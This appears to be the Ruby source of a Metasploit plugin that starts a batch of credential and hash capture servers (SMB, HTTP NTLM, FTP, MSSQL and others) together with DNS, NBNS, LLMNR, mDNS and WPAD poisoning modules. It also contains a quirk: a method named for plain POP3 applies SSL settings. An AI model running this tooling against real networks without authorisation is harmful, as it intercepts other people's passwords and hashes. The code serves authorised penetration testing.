require 'uri'
require 'rex/sync/event'

module Msf

class Plugin::HashCapture < Msf::Plugin

  class ConsoleCommandDispatcher
    include Msf::Ui::Console::CommandDispatcher

    class CaptureJobListener
      def initialize(name, done_event)
        @name = name
        @done_event = done_event
      end

      def waiting(id)
        self.succeeded = true
        print_good("#{@name} started")
        @done_event.set
      end

      def start(id); end

      def completed(id, result, mod); end

      def failed(id, error, mod)
        print_error("#{@name} failed to start")
        @done_event.set
      end

      attr_accessor :succeeded

    end

    HELP_REGEX = /^-?-h(?:elp)?$/
    @@opt_parser = Rex::Parser::Arguments.new(
      '-s' => [ true, 'Session to bind on' ],
      '-i' => [ true, 'IP to bind to' ],
      '--spoof' => [ true, 'IP to use for spoofing (poisoning) attacks' ],
      '--regex' => [ true, 'Regex to match for spoofing' ],
      '--basic' => [ false, 'Use Basic auth for HTTP listener' ],
      '--cert' => [ true, 'Path to SSL cert for encrypted communication' ],
      '--configfile' => [ true, 'Path to a config file' ],
      '-v' => [ false, 'Verbose output' ],
    )

    def initialize(*args)
      super(*args)
      @active_job_ids = []
    end

    def name
      'HashCapture'
    end

    def commands
      {
        'capture' => 'Start hash capturing services',
      }
    end

    # The main handler for the request command.
    #
    # @param args [Array<String>] The array of arguments provided by the user.
    # @return [nil]
    def cmd_capture(*args)
      # short circuit the whole deal if they need help
      return help if args.length == 0
      return help if args.length == 1 && args.first =~ HELP_REGEX

      if args.first == 'stop'
        listeners_stop
        return
      end

      if args.first == 'start'
        listeners_start(args)
        return
      end

      return help
    end

    def cmd_capture_tabs(str, words)
      return ['start', 'stop'] if words.length == 1
      if words[1] == 'start'
        case words[-1]                                                                         
          when '-s'
            return framework.sessions.keys.map { |k| k.to_s }                                    
          when '--cert', '--configfile'
            return tab_complete_filenames(str, words)
        end
        
        if @@opt_parser.arg_required?(words[-1])
          # The previous word needs an argument; we can't provide any help
          return []
        end

        result = @@opt_parser.option_keys.select { |opt| opt.start_with?(str) }
        return result
      end
    end

    def listeners_start(args)
      if @active_job_ids.length > 0
        # If there are active job IDs, we should fail: there's already a capture going on.
        # Make them stop it first.
        # The exception is if all jobs have been manually terminated, then let's treat it
        # as if the capture was stopped, and allow starting now.
        @active_job_ids.each do |job_id|

          if framework.jobs.key?(job_id.to_s)
            print_error('Capture already in progress. Stop the existing capture then restart a new one')
            return
          end
        end
        # All jobs have ended - let's clean ourselves up
        @active_job_ids = []
      end

      config = parse_args(args)

      modules = {
        # Capturing
        'drda' => 'auxiliary/server/capture/drda',
        'ftp' => 'auxiliary/server/capture/ftp',
        'imap' => 'auxiliary/server/capture/imap',
        'mssql' => 'auxiliary/server/capture/mssql',
        'mysql' => 'auxiliary/server/capture/mysql',
        'pop3' => 'auxiliary/server/capture/pop3',
        'postgres' => 'auxiliary/server/capture/postgresql',
        'printjob' => 'auxiliary/server/capture/printjob_capture',
        'sip' => 'auxiliary/server/capture/sip',
        'smb' => 'auxiliary/server/capture/smb',
        'smtp' => 'auxiliary/server/capture/smtp',
        'telnet' => 'auxiliary/server/capture/telnet',
        'vnc' => 'auxiliary/server/capture/vnc',

        # SSL versions
        'ftps' => 'auxiliary/server/capture/ftp',
        'imaps' => 'auxiliary/server/capture/imap',
        'pop3s' => 'auxiliary/server/capture/pop3',
        'smtps' => 'auxiliary/server/capture/smtp',

        # Poisoning
        'dns' => 'auxiliary/spoof/dns/native_spoofer',
        'nbns' => 'auxiliary/spoof/nbns/nbns_response',
        'llmnr' => 'auxiliary/spoof/llmnr/llmnr_response',
        'mdns' => 'auxiliary/spoof/mdns/mdns_response',
        'wpad' => 'auxiliary/server/wpad',
      }

      if config[:http_basic]
        modules['http'] = 'auxiliary/server/capture/http_basic'
        modules['https'] = 'auxiliary/server/capture/http_basic'
      else
        modules['http'] = 'auxiliary/server/capture/http_ntlm'
        modules['https'] = 'auxiliary/server/capture/http_ntlm'
      end

      modules_to_run = []

      modules.each do |svc, module_name|
        unless config[:services][svc]
          # This service turned off in config
          next
        end
        # Special case for two variants of HTTP
        if svc.start_with?('http')
          if config[:http_basic]
            svc += '_basic'
          else
            svc += '_ntlm'
          end
        end

        mod = framework.modules.create(module_name)
        # Bail if we couldn't
        unless mod
          # Error: this should exist
          print_error("Error: module not found (#{module_name})")
          return
        end

        datastore = {}
        # Capturers
        datastore['SRVHOST'] = config[:srvhost]

        # Poisoners
        datastore['SPOOFIP'] = config[:spoof_ip]
        datastore['SPOOFIP4'] = config[:spoof_ip]
        datastore['REGEX'] = config[:spoof_regex]
        datastore['ListenerComm'] = config[:session]

        opts = {}
        opts['Options'] = datastore
        opts['RunAsJob'] = true
        if config[:verbose]
          opts['LocalOutput'] = self.driver.output
          datastore['VERBOSE'] = true
        end
        method = "configure_#{svc}"
        if self.respond_to?(method)
          self.send(method, datastore, config)
        end


        # Before running everything, let's do some basic validation of settings
        mod_dup = mod.replicant
        mod_dup._import_extra_options(opts)
        mod_dup.options.validate(mod_dup.datastore)

        modules_to_run.append([svc, mod, opts])
      end

      modules_to_run.each do |svc, mod, opts|
        event = Rex::Sync::Event.new(state=false,auto_reset=false)
        job_listener = CaptureJobListener.new(mod.name, event)


        result = Msf::Simple::Auxiliary.run_simple(mod, opts, job_listener: job_listener)
        job_id = result[1]

        # Wait for the event to trigger (socket server either waiting, or failed)
        event.wait
        if job_listener.succeeded
          # Keep track of it so we can close it upon a `stop` command
          @active_job_ids.append(job_id)
          job = framework.jobs[job_id.to_s]
          # Rename the job for display (to differentiate between the encrypted/plaintext ones in particular)
          job.send(:name=, "Capture service: #{svc.upcase}")
        end
      end

      print_good('Started capture jobs')
    end

    def listeners_stop
      @active_job_ids.each do |job_id|
        framework.jobs.stop_job(job_id) unless framework.jobs[job_id.to_s].nil?
      end
      @active_job_ids = []
      print_line('Capture listeners stopped')
    end

    # Print the appropriate help text depending on an optional option parser.
    #
    # @param msg [String] the first line of the help text to display to the
    #   user.
    #  @return [nil]
    def help(msg = 'Usage: capture [start|stop] [options]')
      print_line(msg)
      print_line(@@opt_parser.usage)
    end

    def read_config(filename)
      options = {}
      File.open(filename, "rb") do |f|                                       
        yamlconf = YAML::load(f)
        options = {
         :spoof_ip => yamlconf['spoof_ip'],
         :spoof_regex => yamlconf['spoof_regex'],
         :srvhost => yamlconf['srvhost'],
         :http_basic => yamlconf['basic'],
         :ntlm_challenge => yamlconf['ntlm_challenge'],
         :ntlm_domain => yamlconf['ntlm_domain'],
         :session => nil,
         :ssl_cert => nil,
         :verbose => false,
         :services => yamlconf['services']
        }
      end
    end

    def parse_args(args = [])
      config_file = nil

      # See if there was a config file set
      @@opt_parser.parse(args) do |opt, idx, val|
        case opt
        when '--configfile'
          config_file = val
        end
      end

      if config_file.nil?
        config_file = File.join(Msf::Config.data_directory,"capture_config.yaml")
      end
      
      options = read_config(config_file)

      @@opt_parser.parse(args) do |opt, idx, val|
        case opt
        when '-s'
          options[:session] = val
        when '-i'
          options[:srvhost] = val
        when '--spoof'
          options[:spoof_ip] = val
        when '--regex'
          options[:spoof_regex] = val
        when '-v'
          options[:verbose] = true
        when '--basic'
          options[:http_basic] = true
        when '--cert'
          options[:ssl_cert] = val
        end
      end


      options
    end

    def configure_smb(datastore, config)
        datastore['SMBDOMAIN'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
    end

    def configure_mssql(datastore, config)
        datastore['DOMAIN_NAME'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
    end

    def configure_http_ntlm(datastore, config)
        datastore['DOMAIN'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
        datastore['SRVPORT'] = 80
    end

    def configure_https_ntlm(datastore, config)
        datastore['DOMAIN'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
        datastore['SSL'] = true
        datastore['SSLCert'] = config[:ssl_cert]
        datastore['SRVPORT'] = 443
    end

    def configure_ftps(datastore, config)
        datastore['SSL'] = true
        datastore['SSLCert'] = config[:ssl_cert]
        datastore['SRVPORT'] = 990
    end

    def configure_imaps(datastore, config)
        datastore['SSL'] = true
        datastore['SSLCert'] = config[:ssl_cert]
        datastore['SRVPORT'] = 993
    end

    def configure_pop3(datastore, config)
        datastore['SSL'] = true
        datastore['SSLCert'] = config[:ssl_cert]
        datastore['SRVPORT'] = 995
    end

    def configure_smtps(datastore, config)
        datastore['SSL'] = true
        datastore['SSLCert'] = config[:ssl_cert]
        datastore['SRVPORT'] = 587
    end
  end

  def initialize(framework, opts)
    super
    add_console_dispatcher(ConsoleCommandDispatcher)
  end

  def cleanup
    remove_console_dispatcher('HashCapture')
  end

  def name
    'Hash Capture'
  end

  def desc
    'Start all hash/password capture and spoofing services'
  end

end # end class

end # end module
